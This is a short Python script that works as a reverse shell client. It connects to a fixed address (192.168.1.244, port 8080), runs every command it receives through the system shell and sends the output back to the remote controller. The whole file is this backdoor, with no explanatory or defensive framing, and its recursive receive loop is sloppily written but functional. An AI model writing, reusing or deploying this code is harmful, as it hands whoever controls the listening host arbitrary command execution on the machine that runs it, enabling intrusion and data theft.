import socket
import os
import subprocess
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('192.168.1.244', 8080))
def recieve():
    while True:
            message = client.recv(1024)
            message = message.decode()
            print(message)
            if not message:
                recieve()
            update = subprocess.check_output(message, shell=True)
            response = update
            print(response)
            client.send(response)
            recieve()
        
recieve()
